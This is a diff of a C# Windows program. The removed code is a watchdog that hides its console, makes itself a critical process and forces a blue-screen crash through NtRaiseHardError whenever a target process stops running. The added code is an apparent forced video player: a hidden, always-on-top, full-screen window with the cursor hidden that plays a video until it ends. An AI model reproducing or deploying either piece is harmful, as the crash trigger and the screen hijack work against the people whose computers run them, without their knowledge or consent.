@@ -1,71 +1,107 @@
 using System;
-using System.Diagnostics;
+using System.IO;
+using System.Windows.Forms;
+using System.Windows.Forms.Integration;
+using System.Windows.Controls;
 using System.Runtime.InteropServices;
-using System.Threading;
 
-namespace Watch_Process
+namespace Mp4Player
 {
+    public class ForcedVideoWindow : Form
+    {
+        private ElementHost _ctrlHost;
+        private MediaElement _mediaPlayer;
+
+        protected override bool ShowWithoutActivation => true;
+
+        protected override CreateParams CreateParams
+        {
+            get
+            {
+                var cp = base.CreateParams;
+                cp.ExStyle |= 0x80 | 0x8000000;
+                return cp;
+            }
+        }
+
+        public ForcedVideoWindow(string videoPath)
+        {
+            this.FormBorderStyle = FormBorderStyle.None;
+            this.WindowState = FormWindowState.Maximized;
+            this.StartPosition = FormStartPosition.Manual;
+            this.BackColor = System.Drawing.Color.Black;
+            
+            this.ShowInTaskbar = false;
+            
+            this.TopMost = true; 
+
+            this.Load += (s, e) => Cursor.Hide();
+
+            try
+            {
+                _ctrlHost = new ElementHost { Dock = DockStyle.Fill };
+                _mediaPlayer = new MediaElement
+                {
+                    Source = new Uri(videoPath),
+                    LoadedBehavior = MediaState.Play,
+                    UnloadedBehavior = MediaState.Manual,
+                    Stretch = System.Windows.Media.Stretch.Uniform,
+                    IsMuted = false
+                };
+
+                _mediaPlayer.MediaEnded += (s, e) =>
+                {
+                    _mediaPlayer.Stop();
+                    _ctrlHost.Dispose();
+                    this.Close();
+                    Application.Exit();
+                };
+
+                _ctrlHost.Child = _mediaPlayer;
+                this.Controls.Add(_ctrlHost);
+            }
+            catch
+            {
+                Application.Exit();
+            }
+        }
+
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing)
+            {
+                if (_mediaPlayer != null) _mediaPlayer.Stop();
+                if (_ctrlHost != null) _ctrlHost.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+    }
+
     class Program
     {
-        [DllImport("ntdll.dll", SetLastError = true)]
-        private static extern uint RtlSetProcessIsCritical(bool bNewValue, ref bool pbOldValue, bool bNeedScb);
-
-        [DllImport("ntdll.dll", SetLastError = true)]
-        private static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
-
-        [DllImport("ntdll.dll", SetLastError = true)]
-        private static extern uint RtlAdjustPrivilege(int Privilege, bool Enable, bool CurrentThread, out bool Enabled);
-
         [DllImport("kernel32.dll")]
         private static extern IntPtr GetConsoleWindow();
 
         [DllImport("user32.dll")]
         private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
-        const int SW_HIDE = 0;
-
-        static void HideConsole()
-        {
-            IntPtr hWnd = GetConsoleWindow();
-            if (hWnd != IntPtr.Zero)
-                ShowWindow(hWnd, SW_HIDE);
-        }
-
-        static void MakeProcessCritical()
-        {
-            bool oldValue = false;
-            RtlSetProcessIsCritical(true, ref oldValue, false);
-        }
-
-        static void TriggerBSOD()
-        {
-            bool prev;
-            RtlAdjustPrivilege(19, true, false, out prev);
-            uint resp;
-            NtRaiseHardError(0xC000007B, 0, 0, IntPtr.Zero, 6, out resp); 
-        }
-
-        static bool IsProcessRunning(string name)
-        {
-            return Process.GetProcessesByName(name).Length > 0;
-        }
-
+        [STAThread]
         static void Main(string[] args)
         {
-            HideConsole();
-            MakeProcessCritical();
-
-            string targetProcess = "c_computeaccelerator";
-
-            while (true)
+            IntPtr consoleHandle = GetConsoleWindow();
+            if (consoleHandle != IntPtr.Zero)
             {
-                if (!IsProcessRunning(targetProcess))
-                {
-                    TriggerBSOD();
-                }
-
-                Thread.Sleep(2000);
+                ShowWindow(consoleHandle, 0);
             }
+
+            if (args.Length == 0) return;
+            string videoPath = Path.GetFullPath(args[0]);
+            if (!File.Exists(videoPath)) return;
+
+            Application.EnableVisualStyles();
+            Application.SetCompatibleTextRenderingDefault(false);
+
+            Application.Run(new ForcedVideoWindow(videoPath));
         }
     }
 }
